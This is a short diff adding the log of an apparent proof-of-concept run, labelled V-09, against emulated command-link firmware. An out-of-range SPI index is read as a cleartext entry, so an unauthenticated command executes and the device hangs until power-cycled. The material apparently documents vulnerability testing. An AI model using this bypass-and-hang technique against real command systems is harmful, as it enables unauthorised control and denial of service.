@@ -1,0 +1,16 @@
+[   0.000] ========================================================================
+[   0.000] V-09 unbounded SPI: OOB pass / hang DoS
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x15 via=usb AES  payload=011005
+[   0.000] <-- TM apid=0x15 clear len=6
+[   0.001] <-- TM apid=0x01 AES len=5
+[   0.001] SPI=8327 (beyond table): frames back = True -> OOB entry read as Clear, command executed
+[   0.001] device silent after SPI fault (state HANGED)
+[   0.001] --> advance(30000 ms)
+[   0.001] --> TC apid=0x01 via=radio AES  payload=-
+[   0.001] --> POWER CYCLE (scratch + SRAM die, flash survives)
+[   0.001] --> TC apid=0x01 via=radio AES  payload=-
+[   0.002] <-- TM apid=0x01 AES len=5
+[   0.002] ========================================================================
+[   0.002] POC OK
+[   0.002] ========================================================================
